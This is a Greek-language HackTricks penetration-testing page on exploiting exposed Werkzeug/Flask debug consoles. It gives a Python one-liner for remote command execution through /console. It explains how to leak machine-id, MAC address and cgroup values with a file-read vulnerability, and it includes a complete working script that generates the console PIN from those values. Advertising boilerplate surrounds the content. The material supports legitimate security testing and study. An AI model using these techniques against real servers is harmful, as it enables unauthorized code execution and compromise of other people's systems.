# Werkzeug / Flask Debug

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Άμεσα διαθέσιμη εγκατάσταση για αξιολόγηση ευπαθειών και δοκιμές διείσδυσης**. Εκτελέστε μια πλήρη δοκιμή διείσδυσης από οπουδήποτε με 20+ εργαλεία και χαρακτηριστικά που καλύπτουν από την αναγνώριση έως την αναφορά. Δεν αντικαθιστούμε τους δοκιμαστές διείσδυσης - αναπτύσσουμε προσαρμοσμένα εργαλεία, ανίχνευση και εκμετάλλευση ενοτήτων για να τους δώσουμε πίσω χρόνο για να εξερευνήσουν πιο βαθιά, να αποκτήσουν πρόσβαση σε κελύφη και να διασκεδάσουν.

{% embed url="https://pentest-tools.com/" %}

## Console RCE

Εάν η λειτουργία αποσφαλμάτωσης είναι ενεργή, μπορείτε να δοκιμάσετε να αποκτήσετε πρόσβαση στο `/console` και να κερδίσετε RCE.
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (317).png>)

Υπάρχουν επίσης αρκετές εκμεταλλεύσεις στο διαδίκτυο όπως [αυτή](https://github.com/its-arun/Werkzeug-Debug-RCE) ή μία στο metasploit.

## Προστατευμένο με PIN - Διάβαση Διαδρομής

Σε ορισμένες περιπτώσεις το **`/console`** σημείο πρόσβασης θα προστατεύεται με ένα PIN. Εάν έχετε μια ευπάθεια διάβασης αρχείου, μπορείτε να διαρρεύσετε όλες τις απαραίτητες πληροφορίες για να δημιουργήσετε αυτό το PIN.

### Εκμετάλλευση PIN της Werkzeug Console

Εξαναγκάστε μια σελίδα σφάλματος αποσφαλματοποίησης στην εφαρμογή για να δείτε αυτό:
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
Ένα μήνυμα σχετικά με το σενάριο "κλειδωμένη κονσόλα" συναντάται όταν προσπαθείτε να αποκτήσετε πρόσβαση στη διεπαφή αποσφαλμάτωσης του Werkzeug, που υποδεικνύει την ανάγκη για έναν κωδικό PIN για να ξεκλειδώσετε την κονσόλα. Προτείνεται να εκμεταλλευτείτε τον κωδικό PIN αναλύοντας τον αλγόριθμο παραγωγής του PIN στο αρχείο αρχικοποίησης αποσφαλμάτωσης του Werkzeug (`__init__.py`). Ο μηχανισμός παραγωγής του PIN μπορεί να μελετηθεί από το [**αποθετήριο κώδικα του Werkzeug**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py), αν και συνιστάται να αποκτήσετε τον πραγματικό κώδικα του διακομιστή μέσω μιας ευπάθειας αναζήτησης αρχείων λόγω πιθανών ασυμβατοτήτων των εκδόσεων.

Για να εκμεταλλευτείτε τον κωδικό PIN της κονσόλας, χρειάζονται δύο σύνολα μεταβλητών, τα `probably_public_bits` και `private_bits`:

#### **`probably_public_bits`**
- **`username`**: Αναφέρεται στον χρήστη που ξεκίνησε τη συνεδρία Flask.
- **`modname`**: Συνήθως ορίζεται ως `flask.app`.
- **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`**: Συνήθως αντιστοιχεί στο **Flask**.
- **`getattr(mod, '__file__', None)`**: Αντιπροσωπεύει την πλήρη διαδρομή προς το `app.py` μέσα στον κατάλογο του Flask (π.χ. `/usr/local/lib/python3.5/dist-packages/flask/app.py`). Εάν το `app.py` δεν είναι εφαρμοστέο, **δοκιμάστε το `app.pyc`**.

#### **`private_bits`**
- **`uuid.getnode()`**: Ανακτά τη διεύθυνση MAC της τρέχουσας μηχανής, με την εντολή `str(uuid.getnode())` να τη μετατρέπει σε δεκαδική μορφή.
- Για να **προσδιορίσετε τη διεύθυνση MAC του διακομιστή**, πρέπει να εντοπίσετε την ενεργή δικτυακή διεπαφή που χρησιμοποιείται από την εφαρμογή (π.χ. `ens3`). Σε περιπτώσεις αμφιβολίας, **διαρρεύστε το `/proc/net/arp`** για να βρείτε το αναγνωριστικό της συσκευής, και στη συνέχεια **εξαγάγετε τη διεύθυνση MAC** από το **`/sys/class/net/<αναγνωριστικό συσκευής>/address`**.
- Η μετατροπή μιας διεύθυνσης MAC από δεκαεξαδική σε δεκαδική μορφή μπορεί να γίνει όπως φαίνεται παρακάτω:
```python
# Παράδειγμα διεύθυνσης MAC: 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
- **`get_machine_id()`**: Συνενώνει δεδομένα από τα αρχεία `/etc/machine-id` ή `/proc/sys/kernel/random/boot_id` με την πρώτη γραμμή του `/proc/self/cgroup` μετά την τελευταία κάθετο (`/`).

<details>
<summary>Κώδικας για τη συνάρτηση `get_machine_id()`</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

Μετά τη συλλογή όλων των απαραίτητων δεδομένων, το σενάριο εκμετάλλευσης μπορεί να εκτελεστεί για να δημιουργήσει το PIN της κονσόλας Werkzeug. Το σενάριο χρησιμοποιεί τα συναρμολογημένα `probably_public_bits` και `private_bits` για να δημιουργήσει ένα κατακερματισμένο κείμενο, το οποίο υποβάλλεται σε περαιτέρω επεξεργασία για να παραχθεί το τελικό PIN. Παρακάτω είναι ο κώδικας Python για την εκτέλεση αυτής της διαδικασίας:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
Αυτό το σενάριο παράγει τον PIN με τον κατακερματισμό των συνενωμένων bits, προσθέτοντας συγκεκριμένα αλάτια (`cookiesalt` και `pinsalt`), και διαμορφώνοντας την έξοδο. Είναι σημαντικό να σημειωθεί ότι οι πραγματικές τιμές για τα `probably_public_bits` και `private_bits` πρέπει να αποκτηθούν ακριβώς από το σύστημα προορισμού για να εξασφαλιστεί ότι ο παραγόμενος PIN ταιριάζει με αυτόν που αναμένεται από την κονσόλα Werkzeug.


{% hint style="success" %}
Εάν χρησιμοποιείτε μια **παλαιότερη έκδοση** του Werkzeug, δοκιμάστε να αλλάξετε τον **αλγόριθμο κατακερματισμού σε md5** αντί για sha1.
{% endhint %}

## Αναφορές

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Άμεσα διαθέσιμη εγκατάσταση για αξιολόγηση ευπαθειών και δοκιμές διείσδυσης**. Εκτελέστε μια πλήρη δοκιμή διείσδυσης από οπουδήποτε με 20+ εργαλεία και χαρακτηριστικά που καλύπτουν από την αναγνώριση έως την αναφορά. Δεν αντικαθιστούμε τους δοκιμαστές διείσδυσης - αναπτύσσουμε προσαρμοσμένα εργαλεία, ανίχνευση και εκμετάλλευση για να τους δώσουμε περισσότερο χρόνο για να εξερευνήσουν βαθύτερα, να αποκτήσουν πρόσβαση σε συστήματα και να διασκεδάσουν.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας στο hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
